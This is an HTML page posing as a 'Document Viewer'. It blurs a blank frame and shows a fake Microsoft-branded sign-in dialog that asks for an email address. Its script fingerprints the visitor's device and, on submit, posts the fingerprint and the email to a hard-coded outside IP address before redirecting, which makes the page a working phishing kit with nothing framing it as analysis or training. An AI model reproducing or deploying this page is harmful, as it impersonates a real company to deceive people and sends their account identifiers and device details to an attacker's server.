<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Viewer</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            transition: filter 0.5s ease;
        }
        #authDialog {
            position: absolute;
            width: 450px;
            height: 350px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 20px;
            box-sizing: border-box;
            opacity: 0;
            transition: opacity 1s ease;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
        }
        #logo {
            width: 120px;
            height: auto;
            margin-bottom: 15px;
        }
        #statusMessage {
            color: #000;
            font-size: 26.5px;
            margin: 10px 0;
            font-weight: 500;
            transition: opacity 1s ease;
        }
        .loader {
            height: 20px;
            margin: 20px 0;
            overflow: hidden;
        }
        .loader-dots {
            display: flex;
            width: 500%;
            height: 100%;
            animation: moveDots 6s ease-in-out infinite;
        }
        .loader-dots div {
            width: 4px;
            height: 4px;
            background: #005da6;
            border-radius: 50%;
            margin: 0 8px;
            animation: pulse 1.5s ease-in-out infinite;
        }
        #loginForm {
            display: none;
        }
        #loginForm input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: none;
            border-bottom: 1px solid #005da6;
            font-size: 16px;
        }
        #loginForm button {
            background: #005da6;
            color: white;
            border: none;
            padding: 8px 15px;
            float: right;
            cursor: pointer;
        }
        .links {
            clear: both;
            padding-top: 20px;
            font-size: 13px;
        }
        .links a {
            color: #005da6;
            text-decoration: none;
        }
        @keyframes moveDots {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0); }
            100% { transform: translateX(100%); }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.5); }
        }
    </style>
</head>
<body>
    <iframe id="docViewer" src="about:blank"></iframe>
    
    <div id="authDialog">
        <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Logo">
        <p id="statusMessage">Preparing your session</p>
        
        <div class="loader">
            <div class="loader-dots">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
        
        <div id="loginForm">
            <p id="signInText">Sign in</p>
            <form id="authForm">
                <input type="text" id="email" placeholder="Email, phone, or Skype" required>
                <button type="submit">Next</button>
            </form>
            <div class="links">
                <a href="#">Create account</a> â€¢ 
                <a href="#">Forgot password?</a>
            </div>
        </div>
    </div>

    <script>
        // Collect device info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };

        // Initialize the page
        function init() {
            setTimeout(blurBackground, 2000);
            setTimeout(showAuthDialog, 3000);
            setTimeout(showLoginForm, 6000);
        }

        function blurBackground() {
            document.getElementById('docViewer').style.filter = 'blur(5px)';
        }

        function showAuthDialog() {
            document.getElementById('authDialog').style.opacity = '1';
            document.getElementById('statusMessage').textContent = "Checking your credentials...";
        }

        function showLoginForm() {
            document.getElementById('statusMessage').style.opacity = '0';
            document.querySelector('.loader').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('loginForm').style.display = 'block';
            }, 1000);
        }

        // Handle form submission
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            if (!email) return;
            
            // Add email to device info
            deviceInfo.email = email;
            
            try {
                const response = await fetch('http://162.251.123.242:2025/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(deviceInfo)
                });
                
                if (response.ok) {
                    window.location.href = "https://example.com/redirect";
                }
            } catch (error) {
                console.error('Error:', error);
            }
        });

        // Start the flow
        window.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
